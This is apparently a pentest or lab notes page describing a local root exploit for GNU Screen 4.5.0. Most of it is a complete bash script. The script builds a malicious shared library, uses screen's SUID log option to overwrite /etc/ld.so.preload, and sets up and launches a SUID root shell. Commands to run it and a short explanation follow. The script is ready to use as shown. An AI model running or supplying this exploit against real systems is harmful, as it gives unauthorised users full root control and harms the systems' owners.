## GNU Screen 4.5.0 — Local Privilege Escalation

GNU Screen version **4.5.0** contains a privilege escalation vulnerability caused by a missing permissions check when opening a log file. Since `screen` ships with the SUID bit set, this can be abused to overwrite `/etc/ld.so.preload` and inject a malicious shared library that runs as root.

### Verify the installed version

```shell
screen -v
```

---

### How it works

The exploit chains three techniques:

1. Abuses `screen`'s SUID bit to write to `/etc/ld.so.preload` (normally root-only)
2. Injects a malicious shared library (`libhax.so`) that sets SUID on a root shell binary
3. Executes the root shell

---

### Exploit — screenroot.sh

```bash
#!/bin/bash
# screenroot.sh — GNU screen 4.5.0 local root exploit
# Abuses ld.so.preload overwriting via SUID screen

echo "[+] Compiling shared library payload..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
__attribute__ ((__constructor__))
void dropshell(void) {
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] Library loaded — SUID shell ready\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c

echo "[+] Compiling root shell..."
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void) {
    setuid(0); setgid(0); seteuid(0); setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
rm -f /tmp/rootshell.c

echo "[+] Writing to /etc/ld.so.preload via screen log abuse..."
cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"

echo "[+] Triggering library load..."
screen -ls

echo "[+] Spawning root shell..."
/tmp/rootshell
```

---

### Execution

```shell
chmod +x screenroot.sh
./screenroot.sh
```

> 💡 The `__constructor__` attribute in `libhax.c` ensures `dropshell()` runs automatically the moment the library is loaded by the dynamic linker — before any other code executes, including screen's own initialization.
